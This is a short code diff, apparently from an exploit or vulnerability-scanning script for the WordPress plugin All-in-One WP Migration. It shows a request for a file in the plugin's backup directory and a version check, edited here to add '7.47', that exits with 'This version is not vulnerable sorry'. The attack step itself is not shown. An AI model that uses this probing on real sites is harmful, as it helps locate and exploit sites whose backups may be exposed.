@@ -38,7 +38,7 @@ response = session.get(url+"/wp-content/ai1wm-backups/web.config", headers=heade
 
 def vercheck (url,headers):
 	vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
-	if "7.15" in vercheck.text:
+	if "7.15" in vercheck.text or "7.47" in vercheck.text:
 		print("This version is not vulnerable sorry")
 		sys.exit(0)
 
